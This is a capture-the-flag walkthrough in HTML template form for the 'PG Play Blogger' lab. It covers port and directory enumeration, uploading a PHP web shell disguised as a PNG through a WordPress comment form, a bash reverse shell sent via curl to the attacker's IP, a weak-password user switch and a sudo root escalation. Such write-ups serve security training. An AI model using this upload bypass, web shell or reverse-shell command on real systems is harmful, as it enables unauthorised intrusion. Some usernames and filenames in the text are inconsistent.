@@ -1,0 +1,120 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Blogger</h1>
+    <p class="text">Difficulty : Easy | Community Rating Hard</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
+|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
+|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Blogger | Home
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">The target machine only opens HTTP. </p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blogger/1.png' %}" alt="">
+    <p class="text">On this page, there are several input fields like login, register, and contact form. However, stopping requests with burpsuite revealed that the forms aren't set and don't function. Therefore, we have to enumerate directories.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 70
+===============================================================
+/.hta                 (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/assets               (Status: 301) [Size: 319] [--&gt; http://192.168.239.217/assets/]
+/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.239.217/css/]
+/images               (Status: 301) [Size: 319] [--&gt; http://192.168.239.217/images/]
+/index.html           (Status: 200) [Size: 46199]
+/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.239.217/js/]
+/server-status        (Status: 403) [Size: 280]
+
+===============================================================</code></pre></div>
+
+<p class="text">However, there are only assets, css, js, and image directory which seem to be not holding juicy information.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blogger/2.png' %}" alt="">
+    <p class="text">However, under the /assets/fonts directory, I found blog page, which is about web-security recon.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blogger/3.png' %}" alt="">
+    <p class="text">Also, on the page <u>http://blogger.pg/assets/fonts/blog/?p=29</u>, I found comment form we can append image file. It's not rare case where a webpage doesn't have sufficient image validation, so we can test malicious file uploading.</p>
+</div>
+<h2 class="subtitle">Foothold</h2>
+
+<p class="text">Actually, we cannot upload exactly 'arbitrary' file, but we can only upload 'png, jpeg, gif, jpg' extensions. Therefore, we have to name our malicious file like <u>rev_shell.php.png</u>. Also, to falsify file format, we might have to append magic bytes.</p>
+
+<div class="code-box"><pre><code>└─$ nano rev.php 
+&lt;?php system($_REQUEST['cmd']);?&gt;
+└─$ echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> hex_rev.php.png
+└─$ cat rev.php >> img_rev.php.png</code></pre></div>
+
+<p class="text">Then, we can test file type with file command.</p>
+<div class="code-box"><pre><code>└─$ file img_rev.php.png rev.php.png
+img_rev.php.png: data
+rev.php.png:     PHP script, ASCII text</code></pre></div>
+
+<p class="text">I could forge image data file with php code. Next, I launch burpsuite and input form, and append created file. Finally, remove png extension.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blogger/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/blogger/5.png' %}" alt="">
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/blogger/6.png' %}" alt="">
+    <p class="text">I successfully uploaded web shell to the target machine. We can get reverse shell using this file.</p>
+</div>
+
+<p class="text">First we need to launch nc with -lvnp flags, and send get request with url encoded reverse shell command using curl command.</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+    
+└─$ curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.205/4444 0>&1'" http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/10/hwrvmtwumxjquhm-1761059237.3823.php</code></pre></div>
+
+<p class="text">Then, connection comes back.</p>
+
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+...
+&lt;ress/assets/fonts/blog/wp-content/uploads/2025/10$ </code></pre></div>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Though there are many stuff we can enumerate, test, and read, we should finish testing low-hanging fruets, which is testable quickly.</p>
+<p class="text">When I tried to change user with password which is the same with username, I could successfully changed to user vagrant.</p>
+
+
+<div class="code-box"><pre><code>└─$ su vargant
+password : vargant</code></pre></div>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Because sudo -l revealed the user vargant can run any command with sudo privilege, we can simply execute command below and generate root bash...</p>
+
+<div class="code-box"><pre><code>└─$ sudo bash
+#</code></pre></div>
+
+<p class="text">You can locate proof.txt under the /root directory.</p>
+
+</body>
+</html>
